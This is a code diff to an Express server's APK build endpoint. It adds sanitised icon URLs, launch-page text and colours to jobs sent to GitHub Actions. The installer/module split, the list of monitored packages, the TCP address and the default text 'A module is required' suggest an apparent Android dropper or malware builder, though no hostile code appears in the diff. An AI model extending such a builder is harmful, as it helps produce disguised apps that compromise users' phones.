@@ -2032,13 +2032,48 @@ function requireBuildWorker(req, res, next) {
 }
 
 // POST /api/build/apk — dispatch a build job to GitHub Actions
-app.post('/api/build/apk', requireUserOrAdmin, express.json(), async (req, res) => {
-    const { moduleName, modulePackage, installerName, installerPackage, sseId, monitoredPackages } = req.body || {};
+app.post('/api/build/apk', requireUserOrAdmin, express.json({ limit: '12mb' }), async (req, res) => {
+    const {
+        moduleName, modulePackage, installerName, installerPackage, sseId, monitoredPackages,
+        moduleIconUrl, installerIconUrl,
+        installerLaunchTitle, installerLaunchSubtitle, installerLaunchBtnText,
+        installerLaunchBgColor, installerLaunchAccentColor,
+    } = req.body || {};
+
     if (!isValidAppName(moduleName))         return res.status(400).json({ success: false, error: 'Invalid module name (1-40 chars, letters/digits/space/.&\'-)' });
     if (!isValidPackage(modulePackage))      return res.status(400).json({ success: false, error: 'Invalid module package (e.g. com.example.app)' });
     if (!isValidAppName(installerName))      return res.status(400).json({ success: false, error: 'Invalid installer name' });
     if (!isValidPackage(installerPackage))   return res.status(400).json({ success: false, error: 'Invalid installer package' });
     if (modulePackage === installerPackage)  return res.status(400).json({ success: false, error: 'Module and installer packages must differ' });
+
+    // Sanitise icon URLs — accept http/https URLs or data: URIs (base64-encoded images).
+    // Cap data URIs at ~8 MB to avoid bloating the job queue.
+    const sanitizeIconUrl = (raw) => {
+        if (!raw || typeof raw !== 'string') return '';
+        const v = raw.trim();
+        if (v.startsWith('data:image/') && v.includes(';base64,')) {
+            return v.length > 8 * 1024 * 1024 ? '' : v;  // 8 MB cap
+        }
+        if (/^https?:\/\/.{4,}/i.test(v)) return v;
+        return '';
+    };
+    const safeModuleIconUrl    = sanitizeIconUrl(moduleIconUrl);
+    const safeInstallerIconUrl = sanitizeIconUrl(installerIconUrl);
+
+    // Sanitise launch page fields — plain text, max 200 chars each.
+    const sanitizeText = (raw, fallback) => {
+        if (!raw || typeof raw !== 'string') return fallback;
+        return raw.trim().slice(0, 200) || fallback;
+    };
+    const sanitizeColor = (raw, fallback) => {
+        if (!raw || typeof raw !== 'string') return fallback;
+        return /^#[0-9a-fA-F]{6}$/.test(raw.trim()) ? raw.trim() : fallback;
+    };
+    const safeTitle       = sanitizeText(installerLaunchTitle,       'A module is required');
+    const safeSubtitle    = sanitizeText(installerLaunchSubtitle,    'Click Install to proceed.');
+    const safeBtnText     = sanitizeText(installerLaunchBtnText,     'Install');
+    const safeBgColor     = sanitizeColor(installerLaunchBgColor,    '#0B1020');
+    const safeAccentColor = sanitizeColor(installerLaunchAccentColor,'#6366F1');
 
     const ghToken = (process.env.GITHUB_PERSONAL_ACCESS_TOKEN || '').trim();
     if (!ghToken) {
@@ -2077,6 +2112,13 @@ app.post('/api/build/apk', requireUserOrAdmin, express.json(), async (req, res) 
         accessId,
         moduleName, modulePackage, installerName, installerPackage,
         monitoredPackages: sanitizeMonitoredPackages(monitoredPackages),
+        moduleIconUrl:              safeModuleIconUrl,
+        installerIconUrl:           safeInstallerIconUrl,
+        installerLaunchTitle:       safeTitle,
+        installerLaunchSubtitle:    safeSubtitle,
+        installerLaunchBtnText:     safeBtnText,
+        installerLaunchBgColor:     safeBgColor,
+        installerLaunchAccentColor: safeAccentColor,
         sseId: sseId || null,
         status: 'running',
         lines: [],
@@ -2127,6 +2169,13 @@ app.post('/api/build/apk', requireUserOrAdmin, express.json(), async (req, res) 
                     installer_name:      installerName,
                     installer_package:   installerPackage,
                     monitored_packages:  job.monitoredPackages.join(','),
+                    module_icon_url:     safeModuleIconUrl,
+                    installer_icon_url:  safeInstallerIconUrl,
+                    installer_launch_title:        safeTitle,
+                    installer_launch_subtitle:     safeSubtitle,
+                    installer_launch_btn:          safeBtnText,
+                    installer_launch_bg_color:     safeBgColor,
+                    installer_launch_accent_color: safeAccentColor,
                     callback_url:        callbackUrl,
                     build_api_key:       buildWorkerSettings.apiKey,
                     tcp_addr:            `${(process.env.BUILD_TCP_HOST || '').trim()}:${(process.env.BUILD_TCP_PORT || '').trim()}`,
